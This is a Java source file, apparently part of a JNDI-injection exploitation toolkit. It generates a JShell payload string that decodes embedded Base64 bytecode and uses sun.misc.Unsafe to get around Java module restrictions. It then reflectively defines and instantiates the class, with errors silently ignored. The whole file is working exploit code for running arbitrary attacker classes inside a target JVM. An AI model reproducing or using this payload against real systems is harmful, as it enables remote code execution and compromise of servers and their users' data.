package map.jndi.payload;

import java.util.Base64;

public class JShellPayload {
    public static String loadClass(byte[] byteCode) {
        return "new Runnable() {" +
                "    @Override" +
                "    public void run() {" +
                "        String s = \"" + Base64.getEncoder().encodeToString(byteCode) + "\";" +
                "        byte[] bt = java.util.Base64.getDecoder().decode(s);" +
                "        Object unsafe = null;" +
                "        Object rawModule = null;" +
                "        long offset = 48;" +
                "        java.lang.reflect.Method getAndSetObjectM = null;" +
                "        try {" +
                "            Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\");" +
                "            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");" +
                "            unsafeField.setAccessible(true);" +
                "            unsafe = unsafeField.get(null);" +
                "            rawModule = Class.class.getMethod(\"getModule\").invoke(this.getClass(), (Object[]) null);" +
                "            Object module = Class.class.getMethod(\"getModule\").invoke(Object.class, (Object[]) null);" +
                "            java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod(\"objectFieldOffset\", java.lang.reflect.Field.class);" +
                "            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField(\"module\"));" +
                "            getAndSetObjectM = unsafe.getClass().getMethod(\"getAndSetObject\", Object.class, long.class, Object.class);" +
                "            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);" +
                "        } catch (Exception ignored) {" +
                "        }" +
                "        try {" +
                "            java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());" +
                "            java.lang.reflect.Method defMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);" +
                "            defMethod.setAccessible(true);" +
                "            Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, bt, 0, bt.length);" +
                "            if (getAndSetObjectM != null) {" +
                "                getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);" +
                "            }" +
                "            clazz.newInstance();" +
                "        } catch (Exception ignored) {" +
                "        }" +
                "    }" +
                "}.run();";
    }
}
